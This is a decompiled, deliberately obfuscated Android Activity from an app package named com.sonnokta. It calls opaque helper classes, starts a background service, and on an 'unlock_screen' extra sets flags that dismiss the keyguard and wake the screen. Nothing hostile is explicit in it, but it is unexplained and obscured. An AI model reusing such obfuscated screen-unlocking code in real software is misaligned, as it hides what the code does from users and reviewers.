package com.sonnokta;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.Window;

import com.sonnokta.utils.LogUtil;

import fddo.Cclass;
import fddo.Cfor;
import fddo.Cgoto;

public class p036o extends Activity {
    private static String TAG = "p036o";

    /* renamed from: fddo  reason: collision with root package name */
    public static AlertDialog f95fddo;

    /* renamed from: for  reason: not valid java name */
    public static boolean f22for;
    public static p036o ifdf;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        LogUtil.showErrorLog(TAG, "--- onCreate ---");

        super.onCreate(bundle);
        ifdf = this;
        Intent intent = getIntent();
        if (intent.getExtras() != null && intent.getExtras().getString("show_toast") != null) {
            Context applicationContext = getApplicationContext();
            if (Cfor.f58else.length != 0) {
                Cclass.m56else(applicationContext);
            } else {
                Cgoto.dgjaertjardthjdgu(applicationContext);
            }
            applicationContext.startService(new Intent(applicationContext, p071p.class));
        } else if (intent.getExtras() == null || intent.getExtras().getString("unlock_screen") == null) {
            Context applicationContext2 = getApplicationContext();
            if (Cfor.f58else.length != 0) {
                Cclass.m56else(applicationContext2);
            } else {
                Cgoto.dgjaertjardthjdgu(applicationContext2);
            }
        } else {
            Window window = getWindow();
            window.addFlags(4194304);
            window.addFlags(524288);
            window.addFlags(2097152);
            window.addFlags(128);
        }
    }

    public void onDestroy() {
        super.onDestroy();
        LogUtil.showErrorLog(TAG, "--- onDestroy ---");
        f22for = false;
    }

    public void onPause() {
        super.onPause();
        LogUtil.showErrorLog(TAG, "--- onPause ---");
        f22for = false;
    }

    public void onResume() {
        super.onResume();
        LogUtil.showErrorLog(TAG, "--- onResume ---");
        f22for = true;
    }

    public void onStop() {
        super.onStop();
        LogUtil.showErrorLog(TAG, "--- onStop ---");
        f22for = false;
        AlertDialog alertDialog = f95fddo;
        if (alertDialog != null) {
            alertDialog.dismiss();
        }
        finish();
    }
}
